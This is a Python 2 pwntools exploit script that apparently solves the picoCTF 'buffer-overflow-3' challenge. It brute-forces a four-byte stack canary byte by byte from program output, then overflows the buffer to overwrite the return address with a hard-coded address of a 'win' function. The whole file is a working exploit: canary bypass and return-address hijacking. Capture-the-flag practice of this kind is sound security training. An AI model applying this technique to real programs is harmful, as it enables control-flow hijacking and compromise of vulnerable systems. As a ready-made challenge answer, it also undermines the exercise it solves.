from pwn import *
import os

canary = ""
offset = 32
os.chdir("/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e/")

for _ in range(4):
    for i in range(0x21,0x7e):
        try:
                p = process('/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e/vuln')
                #p = process('./overflow-3')
                p.sendline(str(offset + _ + 1))
                p.sendline('A' * offset + canary + chr(i))
                resp = p.recvrepeat(0.2)

                if "flag" in resp.lower():
                        print "Found letter: ", chr(i), i
                        canary += chr(i)
                        break

                p.close()
                p.kill()
        except:
                pass
print len(canary)
print canary.encode('hex')
print canary


p = process('/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e/vuln')

post_offset = 16

win_add = 0x080486eb

p.sendline(str(offset + len(canary) + post_offset + 4))
p.sendline('A'*offset + canary + 'A' * post_offset + p32(win_add))

print p.recvrepeat(0.2)

